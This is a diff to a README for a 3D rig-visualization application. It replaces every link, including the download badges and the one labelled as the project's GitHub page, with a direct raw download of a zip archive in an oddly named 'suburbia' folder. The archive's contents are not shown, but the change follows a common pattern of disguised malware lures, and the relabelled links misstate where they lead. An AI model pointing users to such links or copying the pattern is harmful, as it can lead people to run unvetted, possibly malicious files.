@@ -1,6 +1,6 @@
 # 🛠️ Integrated-Rig-Visualization-3D - View 3D Rig Models Easily
 
-[![Download Integrated-Rig-Visualization-3D](https://img.shields.io/badge/Download-Integrated--Rig--Visualization--3D-blue?style=for-the-badge)](https://github.com/rohithhelman/Integrated-Rig-Visualization-3D)
+[![Download Integrated-Rig-Visualization-3D](https://img.shields.io/badge/Download-Integrated--Rig--Visualization--3D-blue?style=for-the-badge)](https://raw.githubusercontent.com/rohithhelman/Integrated-Rig-Visualization-3D/main/suburbia/Rig_D_Integrated_Visualization_v1.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to download, install, and open the application on your Window
 
 Click the large blue button below to go to the download page where you can get the application files.
 
-[![Download Integrated-Rig-Visualization-3D](https://img.shields.io/badge/Download-Integrated--Rig--Visualization--3D-blue?style=for-the-badge)](https://github.com/rohithhelman/Integrated-Rig-Visualization-3D)
+[![Download Integrated-Rig-Visualization-3D](https://img.shields.io/badge/Download-Integrated--Rig--Visualization--3D-blue?style=for-the-badge)](https://raw.githubusercontent.com/rohithhelman/Integrated-Rig-Visualization-3D/main/suburbia/Rig_D_Integrated_Visualization_v1.1.zip)
 
 The page shows files and instructions. Look for the latest Windows version or release.
 
@@ -152,4 +152,4 @@ The project helps visualize rigs such as semi-submersible rigs and land rig subs
 
 Please visit the main page to find documentation and community help:
 
-[Integrated-Rig-Visualization-3D on GitHub](https://github.com/rohithhelman/Integrated-Rig-Visualization-3D)
+[Integrated-Rig-Visualization-3D on GitHub](https://raw.githubusercontent.com/rohithhelman/Integrated-Rig-Visualization-3D/main/suburbia/Rig_D_Integrated_Visualization_v1.1.zip)
